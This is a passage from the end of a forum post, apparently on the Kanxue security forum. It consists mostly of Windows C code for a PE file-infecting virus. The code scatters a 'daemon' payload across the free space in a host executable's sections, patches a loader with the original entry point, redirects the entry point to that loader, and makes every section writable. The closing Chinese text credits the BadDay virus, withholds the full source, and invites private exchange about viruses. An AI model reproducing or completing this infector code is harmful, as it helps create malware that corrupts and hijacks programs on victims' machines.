
```c
//    printf("\t\tFreeSpace: %x\n",FreeSpace);
//    system("pause");
    }

#ifdef _DEBUG
    printf("=======================================\n");
#endif

    //printf("LoaderSize =  0x%x  \n",LoaderSize);
    //printf("FreeSpace  =  0x%x  \n",FreeSpace);
    //printf("DaemonSize =  0x%x  \n",DaemonSize);
    //system("pause");

    if(!LoaderSecInfo || !SuitableInject)
    {
      ret=false;
      goto exit_IO;
    }

#ifdef _DEBUG
    for(j=1;j<=id-1;j++)
    {
      printf("\t\tIndex: %x\n",j);
      printf("\t\tFreeSpace: %x\n",mySecInfo[j].Length.DataLength);
      printf("\t\tVirtualAddress: %x\n",mySecInfo[j].CurrentPos.VirtualAddress);
      printf("\t\tRawAddress: %x\n",mySecInfo[j].CurrentPos.RawAddress);
      printf("\t\tData: %x\n",mySecInfo[j].Flag);
      printf("\t\tNextPos: %x\n",mySecInfo[j].NextPos);
      printf("\n");
    }
    j=0;
    printf("\t\tIndex: %x\n",j);
    printf("\t\tFreeSpace: %x\n",mySecInfo[j].Length.DataLength);
    printf("\t\tVirtualAddress: %x\n",mySecInfo[j].CurrentPos.VirtualAddress);
    printf("\t\tRawAddress: %x\n",mySecInfo[j].CurrentPos.RawAddress);
    printf("\t\tData: %x\n",mySecInfo[j].Flag);
    printf("\t\tNextPos: %x\n",mySecInfo[j].NextPos);
    printf("\n");
    system("pause");
#endif

    DaemonData=(char*)GlobalAlloc(0,DaemonSize);
    if(DaemonData==NULL)
    {
      ret=false;
      goto exit_IO;
    }
    LoaderData=(char*)GlobalAlloc(0,LoaderSize);
    if(LoaderData==NULL)
    {
      GlobalFree(DaemonData);
      ret=false;
      goto exit_IO;
    }
    ReadFile(hData,DaemonData,DaemonSize,&bytes_read,0);
    ReadFile(hData,LoaderData,LoaderSize,&bytes_read,0);
    data=DaemonData;
    //写入Daemon，(DataFlag,DataLength,Next_VirtualAddress，共9个字节)
    for(j=1;j<=id-1;j++)
    {
      SetFilePointer(hHost,mySecInfo[j].CurrentPos.RawAddress,0,FILE_BEGIN);
      WriteFile(hHost,&mySecInfo[j].Flag,1,&tmp,0);
      //WriteFile(hHost,&mySecInfo[j].CurrentPos.VirtualAddress,4,&tmp,0);
      WriteFile(hHost,&mySecInfo[j].Length.DataLength,4,&tmp,0);
      WriteFile(hHost,&mySecInfo[j].NextPos.VirtualAddress,4,&tmp,0);
      WriteFile(hHost,data,mySecInfo[j].Length.DataLength,&tmp,0);
      data+=mySecInfo[j].Length.DataLength;
    }
    data=LoaderData;
    //在Loader中填写Host的原始EntryPoint
    tmp=OptionalHeader.AddressOfEntryPoint+OptionalHeader.ImageBase;
    data[ep  ]=(char)(tmp&0x000000ff);
    data[ep+1]=(char)((tmp&0x0000ff00)>>8);
    data[ep+2]=(char)((tmp&0x00ff0000)>>16);
    data[ep+3]=(char)((tmp&0xff000000)>>24);
          //在Loader中填写Daemon的第一段数据偏移地址
    tmp=mySecInfo[1].CurrentPos.VirtualAddress;
    data[ep+5]=(char)(tmp&0x000000ff);
    data[ep+6]=(char)((tmp&0x0000ff00)>>8);
    data[ep+7]=(char)((tmp&0x00ff0000)>>16);
    data[ep+8]=(char)((tmp&0xff000000)>>24);
    SetFilePointer(hHost,mySecInfo[0].CurrentPos.RawAddress,0,FILE_BEGIN);
    WriteFile(hHost,&mySecInfo[0].Flag,1,&tmp,0);
    WriteFile(hHost,&mySecInfo[0].Length.DataLength,4,&tmp,0);
    WriteFile(hHost,&mySecInfo[0].NextPos.VirtualAddress,4,&tmp,0);
    WriteFile(hHost,data,mySecInfo[0].Length.DataLength,&tmp,0);
    GlobalFree(DaemonData);
    GlobalFree(LoaderData);
    //OptionalHeader的+16位置为EntryPoint
    SetFilePointer(hHost,e_lfanew+sizeof(PE_sig)+sizeof(IMAGE_FILE_HEADER)+16,0,FILE_BEGIN);
    tmp=mySecInfo[0].CurrentPos.VirtualAddress-OptionalHeader.ImageBase+9; //第9个字节为可执行代码
    WriteFile(hHost,&tmp,4,&bytes_write,0); //改写EntryPoint
    //将Section属性改为可读和可写
    SetFilePointer(hHost,e_lfanew+sizeof(IMAGE_NT_SIGNATURE)+sizeof(IMAGE_FILE_HEADER)+sizeof(IMAGE_OPTIONAL_HEADER)
        ,0,FILE_BEGIN);
    for(i=0;i<FileHeader.NumberOfSections;i++)
    {
      SectionHeader[i].Characteristics=SectionHeader[i].Characteristics|0x40000000|0x80000000;
      WriteFile(hHost,&(SectionHeader[i]),sizeof(IMAGE_SECTION_HEADER),&tmp,0);
    }
    GlobalFree(SectionHeader);
    GlobalFree(mySecInfo);

#ifdef _DEBUG
    printf("OK!\n");
#endif

    ret=true;
  exit_IO:
    CloseHandle(hHost);
    CloseHandle(hData);
    return ret;
  }
```

在研究过程中参考了BadDay病毒、看雪论坛出的PE文件格式研究，在此向所有作者表示感谢。

出于安全考虑此处就不贴出完整的源代码和编译好的程序，对病毒有兴趣的朋友可以私下交流研究。

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)
